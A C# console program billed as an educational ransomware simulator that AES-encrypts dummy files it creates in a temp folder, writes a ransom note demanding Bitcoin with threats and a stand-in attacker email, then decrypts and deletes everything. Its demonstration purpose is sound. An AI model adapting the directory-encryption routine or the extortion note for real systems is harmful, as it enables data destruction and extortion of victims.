using System;
using System.Collections.Generic;
using System.ComponentModel.Design.Serialization;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomwareSimulator
{
    class Program
    {
        public static string autor = $@"                
      | |      | (_)      
 ____ | |  _ __| |_  ____ 
|    \| |_/ ) _  | |/ ___)
| | | |  _ ( (_| | | |    
|_|_|_|_| \_)____|_|_|                  
";
        static void Main(string[] args)
        {
            Console.Write(autor);
            int number = 0;
            Console.WriteLine("Educational Ransomware Simulator");
            Console.WriteLine(" FOR EDUCATIONAL USE ONLY - NEVER USE MALICIOUSLY");
            Console.WriteLine("Select number of files to generate");
            while (number == 0)
            {
                try
                {
                    number = int.Parse(Console.ReadLine());
                }
                catch (Exception e)
                {
                    Console.WriteLine("Error:" + e.Message);
                }
            }
            
            string testDirectory = CreateTestEnvironment(number);
         //   Console.WriteLine("Test folder path: " + testDirectory);
            Console.WriteLine("1. Simulating ransomware attack...");
            SimulateAttack(testDirectory);
            Console.ReadKey();
            Console.WriteLine("\n2. Files encrypted. Check the test directory.");
            Console.WriteLine("3. Simulating recovery...");
            SimulateRecovery(testDirectory);
            Console.ReadKey();
            Console.WriteLine("\n Simulation complete. Files recovered!");
            Cleanup(testDirectory);
            Console.ReadKey();
        }
        static string CreateTestEnvironment(int number)
        {
            string testDir = Path.Combine(Path.GetTempPath(), "RansomwareTest");
            Directory.CreateDirectory(testDir);

            // Create sample files
            for (int i = 1; i <= number; i++)
            {
                File.WriteAllText(Path.Combine(testDir, $"Document_{i}.txt"),
                    $"This is test document #{i}. Original content.");
            }
            return testDir;
        }
        static void SimulateAttack(string directory)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();
                foreach (string file in Directory.GetFiles(directory, "*.txt"))
                {
                    EncryptFile(file, aes.Key, aes.IV);
                    Console.WriteLine($" Encrypted: {Path.GetFileName(file)}");
                }
                Console.WriteLine(" Test folder path: " + directory);
                CreateRansomNote(directory, aes.Key, aes.IV);
            }
        }
        static void EncryptFile(string filePath, byte[] key, byte[] iv)
        {
            byte[] original = File.ReadAllBytes(filePath);

            using (Aes aes = Aes.Create())
            using (MemoryStream ms = new MemoryStream())
            {
                aes.Key = key;
                aes.IV = iv;

                using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(original, 0, original.Length);
                }

                File.WriteAllBytes(filePath, ms.ToArray());
             
            }
        }
        static void CreateRansomNote(string directory, byte[] key, byte[] iv)
        {
            string note = $@"
   ▄▄▄▄███▄▄▄▄      ▄█   ▄█▄ ████████▄   ▄█     ▄████████ 
 ▄██▀▀▀███▀▀▀██▄   ███ ▄███▀ ███   ▀███ ███    ███    ███ 
 ███   ███   ███   ███▐██▀   ███    ███ ███▌   ███    ███ 
 ███   ███   ███  ▄█████▀    ███    ███ ███▌  ▄███▄▄▄▄██▀ 
 ███   ███   ███ ▀▀█████▄    ███    ███ ███▌ ▀▀███▀▀▀▀▀   
 ███   ███   ███   ███▐██▄   ███    ███ ███  ▀███████████ 
 ███   ███   ███   ███ ▀███▄ ███   ▄███ ███    ███    ███ 
  ▀█   ███   █▀    ███   ▀█▀ ████████▀  █▀     ███    ███ 
                   ▀                           ███    ███ 



YOUR FILES HAVE BEEN ENCRYPTED!
=================================

To recover your files:
1. Send 0.1 Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
2. Email payment receipt to: attacker@malicious.com
3. Your decryption key: {Convert.ToBase64String(key)}
4. Your IV: {Convert.ToBase64String(iv)}

WARNING: 
- Do NOT modify files or they'll be lost forever!
- You have 72 hours before price doubles
- Any attempt to remove this software will result in permanent data loss

Contact: attacker@malicious.com
";
            File.WriteAllText(Path.Combine(directory, "READ_ME_TO_DECRYPT.txt"), note);
            Console.WriteLine(" Ransom note created: READ_ME_TO_DECRYPT.txt");
        }
        static void SimulateRecovery(string directory)
        {
            string notePath = Path.Combine(directory, "READ_ME_TO_DECRYPT.txt");
            string noteContent = File.ReadAllText(notePath);
            string keyLine = noteContent.Split(new[] { "Your decryption key: " }, StringSplitOptions.None)[1].Split('\n')[0];
            string ivLine = noteContent.Split(new[] { "Your IV: " }, StringSplitOptions.None)[1].Split('\n')[0];
            byte[] key = Convert.FromBase64String(keyLine);
            byte[] iv = Convert.FromBase64String(ivLine);
            foreach (string file in Directory.GetFiles(directory, "*.txt"))
            {
                if (!file.EndsWith("READ_ME_TO_DECRYPT.txt"))
                {
                    DecryptFile(file, key, iv);
                    Console.WriteLine($" Decrypted: {Path.GetFileName(file)}");
                }
            }
            File.Delete(notePath);
            Console.WriteLine(" Ransom note removed");
        }

        static void DecryptFile(string filePath, byte[] key, byte[] iv)
        {
            byte[] encrypted = File.ReadAllBytes(filePath);

            using (Aes aes = Aes.Create())
            using (MemoryStream ms = new MemoryStream())
            {
                aes.Key = key;
                aes.IV = iv;

                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(encrypted, 0, encrypted.Length);
                }

                File.WriteAllBytes(filePath, ms.ToArray());
            }
        }

        static void Cleanup(string directory)
        {
            try
            {
                Directory.Delete(directory, true);
                Console.WriteLine($"\n Cleaned up test directory: {directory}");
            }
            catch
            {
                Console.WriteLine("\n  Manual cleanup required: " + directory);
            }
        }
    }
}